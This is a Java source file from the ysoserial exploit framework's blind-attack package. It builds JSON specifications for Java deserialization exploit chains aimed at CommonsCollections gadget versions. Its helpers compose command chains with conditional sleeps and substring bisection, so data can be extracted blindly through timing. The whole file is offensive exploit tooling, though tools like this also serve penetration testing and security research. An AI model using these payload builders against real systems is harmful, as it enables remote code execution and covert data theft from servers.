package ysoserial.blind;

import org.json.JSONArray;
import org.json.JSONObject;
import ysoserial.Log;

import java.security.SecureRandom;
import java.util.*;

import static ysoserial.blind.Attack.DEFAULT_SLEEP_TIME;

/**
 * Attack tools - constructing JSON payloads.
 *
 * Created by dusanklinec on 18.09.16.
 */
public class AttackTools {
    private static final SecureRandom rand = new SecureRandom();

    public static JSONObject payloadSleep(long val){
        return Utils.parseJSON(String.format("{cmd:\"sleep\", val:%d}", val));
    }

    public static JSONObject payloadCmd(String cmd){
        return payloadCmd(cmd, null);
    }

    public static JSONObject payloadCmd(String cmd, Object val){
        final JSONObject payload = new JSONObject();
        payload.put("cmd", cmd);
        if (val != null) {
            payload.put("val", val);
        }
        return payload;
    }

    public static JSONObject payloadWithExec(JSONObject obj){
        return payloadWithExec(Collections.singletonList(obj));
    }

    public static JSONObject payloadWithExec(JSONObject obj, boolean randomize, Integer module, JSONObject aux){
        return payloadWithExec(Collections.singletonList(obj), randomize, module, aux);
    }

    public static JSONObject payloadWithExec(Collection<JSONObject> objs){
        return payloadWithExec(objs, true, null, null);
    }

    /**
     * Creates the payload JSON specification from the exec chain.
     * @param objs exec chain
     * @param randomize if true the chain is prefixed by ConstTransformer with random value.
     * @param module CommonsCollection exploit version
     * @param aux Another JSON object which will be merged with the main JSON specification. May contain wrapping structure.
     * @return payload JSON specification
     */
    public static JSONObject payloadWithExec(Collection<JSONObject> objs, boolean randomize, Integer module, JSONObject aux){
        JSONObject ps = new JSONObject();
        JSONArray exec = new JSONArray();

        // Randomize payload with new constant random prefix - the first in chain.
        if (randomize){
            exec.put(Utils.parseJSON(String.format("{cmd:\"const\", long: %s}", rand.nextLong())));
        }

        // The core
        for(JSONObject j : objs){
            exec.put(j);
        }
        ps.put("exec", exec);

        // Exploit module - specific one
        if (module != null){
            ps.put("module", module);
        }

        // Merge with this JSONObject. May contain more info
        if (aux != null) {
            for (String keyAux : aux.keySet()) {
                ps.put(keyAux, aux.get(keyAux));
            }
        }

        return ps;
    }

    public static Collection<JSONObject> getBisectLen(Collection<JSONObject> stringFetch,
                                                      int start, int stop)
    {
        List<JSONObject> objs = new LinkedList<>();
        objs.addAll(stringFetch);
        objs.add(Utils.parseJSON(String.format("{cmd:\"substr\", start:%d, stop:%d}", start, stop)));
        objs.add(payloadSleep(DEFAULT_SLEEP_TIME));
        return objs;
    }

    public static Collection<JSONObject> getBisectSpec(Collection<JSONObject> stringFetch,
                                                       int charIdx,
                                                       String range)
    {
        return getBisectSpec(stringFetch, charIdx, range, false);
    }

    public static Collection<JSONObject> getBisectSpec(Collection<JSONObject> stringFetch,
                                                       int charIdx,
                                                       String range,
                                                       boolean negateSleep)
    {
        JSONObject iff = new JSONObject();
        iff.put("cmd", "if");
        JSONArray arr = new JSONArray();

        for(JSONObject obj : stringFetch){
            arr.put(obj);
        }

        if (negateSleep){
            final JSONObject not = payloadCmd("not", null);
            not.put("pred", arr);
            iff.put("pred", not);

        } else {
            iff.put("pred", arr);
        }

        JSONObject substr = Utils.parseJSON(String.format("{cmd:\"substr\", start:%d, stop:%d}", charIdx, charIdx+1));
        arr.put(substr);

        JSONObject matches = payloadCmd("matches", range);
        arr.put(matches);

        JSONObject sleep = payloadSleep(DEFAULT_SLEEP_TIME);
        iff.put("then", sleep);

        return Collections.singletonList(iff);
    }

    public static JSONObject sleepOnPredicate(Collection<JSONObject> predicate){
        final JSONObject ifSleep = payloadCmd("if", null);
        ifSleep.put("pred", predicate);
        ifSleep.put("then", payloadSleep(DEFAULT_SLEEP_TIME));
        return ifSleep;
    }

    public static JSONObject sleepOnPredicate(JSONObject predicate){
        final JSONObject ifSleep = payloadCmd("if", null);
        ifSleep.put("pred", predicate);
        ifSleep.put("then", payloadSleep(DEFAULT_SLEEP_TIME));
        return ifSleep;
    }
}
